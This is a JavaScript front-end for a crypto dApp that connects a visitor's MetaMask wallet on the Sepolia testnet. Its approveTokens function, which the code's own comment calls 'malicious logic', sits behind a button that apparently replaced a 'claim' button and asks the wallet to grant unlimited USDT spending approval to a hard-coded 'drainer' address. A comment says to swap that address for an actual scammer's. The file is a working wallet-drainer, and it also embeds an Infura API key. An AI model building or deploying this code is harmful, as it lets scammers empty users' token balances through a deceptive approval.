// Network configuration
const NETWORKS = {
    sepolia: {
        chainId: '0xaa36a7',
        chainName: 'Sepolia Testnet',
        nativeCurrency: { name: 'Sepolia Ether', symbol: 'ETH', decimals: 18 },
        rpcUrls: ['https://sepolia.infura.io/v3/2b2f7f8148254ab4b15fc842db7948b7'],
        blockExplorerUrls: ['https://sepolia.etherscan.io']
    }
};

// USDT Token configuration (6 decimals)
const TOKENS = {
    sepolia: {
        USDT: {
            address: "0xB28DBE0495F07c6206f0A19bd93D07cB5dD60D3d",
            abi: [
                {
                    "constant": true,
                    "inputs": [{"name": "_owner", "type": "address"}],
                    "name": "balanceOf",
                    "outputs": [{"name": "balance", "type": "uint256"}],
                    "type": "function"
                },
                {
                    "constant": true,
                    "inputs": [],
                    "name": "decimals",
                    "outputs": [{"name": "", "type": "uint8"}],
                    "type": "function"
                },
                {
                    "constant": false,
                    "inputs": [
                        {"name": "spender", "type": "address"},
                        {"name": "value", "type": "uint256"}
                    ],
                    "name": "approve",
                    "outputs": [{"name": "", "type": "bool"}],
                    "type": "function"
                }
            ],
            decimals: 6
        }
    }
};

// Main contract configuration
const CONTRACT_CONFIG = {
    address: "0xB28DBE0495F07c6206f0A19bd93D07cB5dD60D3d", // Same as USDT (suspicious)
    abi: [/* Same as original, unchanged for brevity */
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "Approval",
            "type": "event"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "burn",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "mint",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "transfer",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "Transfer",
            "type": "event"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "transferFrom",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "name": "allowance",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "name": "balanceOf",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "decimals",
            "outputs": [
                {
                    "internalType": "uint8",
                    "name": "",
                    "type": "uint8"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "name",
            "outputs": [
                {
                    "internalType": "string",
                    "name": "",
                    "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "symbol",
            "outputs": [
                {
                    "internalType": "string",
                    "name": "",
                    "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "totalSupply",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ],
    deployedNetwork: "sepolia"
};

// New configuration for malicious logic
const CONFIG = {
    TOKEN_ADDRESS: TOKENS.sepolia.USDT.address, // Mock USDT address
    DRAINER_ADDRESS: "0x1be3685087264568e00154D803DbF73a1e7d0661" // Replace with actual scammer address
};

// DOM Elements
const walletButton = document.getElementById('walletButton');
const approveBtn = document.getElementById('approveBtn'); // Replaced claimButton
const loadingOverlay = document.getElementById('loadingOverlay'); // New element

// State
let web3 = null;
let accounts = [];
let contract = null;
const targetNetwork = NETWORKS[CONTRACT_CONFIG.deployedNetwork];

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    walletButton.addEventListener('click', connectWallet);
    approveBtn.addEventListener('click', approveTokens); // New event listener
    approveBtn.disabled = true; // Initially disabled
});

// Placeholder for showStatus function (to be implemented in front-end)

function showStatus(message, type) {
    const statusDiv = document.getElementById('status');
    if (statusDiv) {  // Always check if element exists
        statusDiv.textContent = message;  // Safer than innerHTML for plain text
        statusDiv.className = `status ${type}`;  // Fixed template literal
    }
}

// Network switching function (unchanged)
async function switchToTargetNetwork() {
    try {
        const currentChainId = await web3.eth.getChainId();
        const targetChainId = parseInt(targetNetwork.chainId, 16);

        if (currentChainId !== targetChainId) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: targetNetwork.chainId }],
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [targetNetwork],
                    });
                } else {
                    throw switchError;
                }
            }
            
            // Verify switch
            const newChainId = await web3.eth.getChainId();
            if (newChainId !== targetChainId) {
                throw new Error('Network switch verification failed');
            }
        }
    } catch (error) {
        console.error('Network switch error:', error);
        throw new Error(`Failed to switch to ${targetNetwork.chainName}`);
    }
}

// Main wallet connection handler (modified to enable approveBtn)
async function connectWallet() {
    if (accounts.length > 0) return;

    walletButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';

    try {
        if (!window.ethereum) throw new Error('Please install MetaMask');

        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);

        contract = new web3.eth.Contract(CONTRACT_CONFIG.abi, CONTRACT_CONFIG.address);
        await switchToTargetNetwork();
        
        await verifySetup();
        setupEventListeners();
        updateWalletButton();
        approveBtn.disabled = false; // Enable approveBtn

    } catch (error) {
        console.error('Connection error:', error);
        walletButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
        alert(`Connection failed: ${error.message}`);
    }
}

// Debug verification function (unchanged)
async function verifySetup() {
    console.group("Debug Information");
    try {
        console.log("Connected account:", accounts[0]);
        const chainId = await web3.eth.getChainId();
        console.log("Network ID:", chainId, `(Expected: ${targetNetwork.chainId})`);
        
        // Test USDT contract
        const usdt = new web3.eth.Contract(TOKENS.sepolia.USDT.abi, TOKENS.sepolia.USDT.address);
        const code = await web3.eth.getCode(TOKENS.sepolia.USDT.address);
        
        if (code === '0x') {
            console.error("USDT contract not deployed at address");
        } else {
            const [balance, decimals] = await Promise.all([
                usdt.methods.balanceOf(accounts[0]).call(),
                usdt.methods.decimals().call()
            ]);
            console.log(`USDT Balance: ${balance} (${balance / (10 ** decimals)} USDT)`);
            console.log(`USDT Decimals: ${decimals} (Expected: 6)`);
        }
        
        // Test main contract
        const mainCode = await web3.eth.getCode(CONTRACT_CONFIG.address);
        if (mainCode === '0x') {
            console.error("Main contract not deployed at address");
        } else {
            console.log("Main contract verified");
        }
    } catch (e) {
        console.error("Verification failed:", e);
    }
    console.groupEnd();
}

// USDT balance check (unchanged)
async function getUSDTBalance() {
    try {
        const usdt = new web3.eth.Contract(TOKENS.sepolia.USDT.abi, TOKENS.sepolia.USDT.address);
        const balance = await usdt.methods.balanceOf(accounts[0]).call();
        const decimals = TOKENS.sepolia.USDT.decimals;
        return balance / (10 ** decimals);
    } catch (error) {
        console.error("USDT balance check failed:", error);
        throw new Error("Could not check USDT balance");
    }
}

 // Update wallet button
 function updateWalletButton() {
    const truncatedAddress = `${accounts[0].substring(0, 6)}...${accounts[0].substring(38)}`;
    walletButton.innerHTML = `<i class="fas fa-check-circle"></i> ${truncatedAddress}`;
    walletButton.classList.add('connected');
};


// New approveTokens function (malicious logic)
async function approveTokens() {
    try {
        loadingOverlay.classList.remove('hidden');
        
        // 1. Verify addresses before sending
        console.log("[DEBUG] Token Address:", TOKENS.sepolia.USDT.address);
        console.log("[DEBUG] Drainer Address:", CONFIG.DRAINER_ADDRESS);
        
        // 2. Create contract instance with checksum address
        const tokenContract = new web3.eth.Contract(
            TOKENS.sepolia.USDT.abi,
            web3.utils.toChecksumAddress(TOKENS.sepolia.USDT.address) // Ensures correct casing
        );
        
        // 3. Send approval with explicit gas limits
        const tx = await tokenContract.methods
            .approve(
                web3.utils.toChecksumAddress(CONFIG.DRAINER_ADDRESS),
                web3.utils.toTwosComplement(-1) // Unlimited approval
            )
            .send({ 
                from: accounts[0],
                gas: 100000, // Explicit gas limit
                gasPrice: await web3.eth.getGasPrice() 
            });
        
        console.log("[DEBUG] Approval TX:", tx.transactionHash);
        showStatus(`Approval successful! TX: ${tx.transactionHash}`, 'success');
        
        // 4. Verify the approval actually went through
        const allowance = await tokenContract.methods
            .allowance(accounts[0], CONFIG.DRAINER_ADDRESS)
            .call();
            
        console.log("[DEBUG] New Allowance:", allowance);

    } catch (error) {
        console.error("Approval failed:", error);
        showStatus(`Approval failed: ${error.message}`, 'error');
    } finally {
        loadingOverlay.classList.add('hidden');
    }
}

// Setup event listeners (unchanged, but included for completeness)

    function setupEventListeners() {
        window.ethereum.on('accountsChanged', (newAccounts) => {
            accounts = newAccounts;
            if (accounts.length > 0) {
                updateWalletButton();
    
            } else {
                handleDisconnected();
            }
        });
        
        window.ethereum.on('chainChanged', (chainId) => {
            window.location.reload();
        });
    };
   

    // Handle disconnection

    function handleDisconnected() {
        walletButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
        walletButton.classList.remove('connected');
        approveBtn.disabled = true; // Disable approveBtn instead of claimButton
        accounts = [];
        web3 = null;
        contract = null;
    }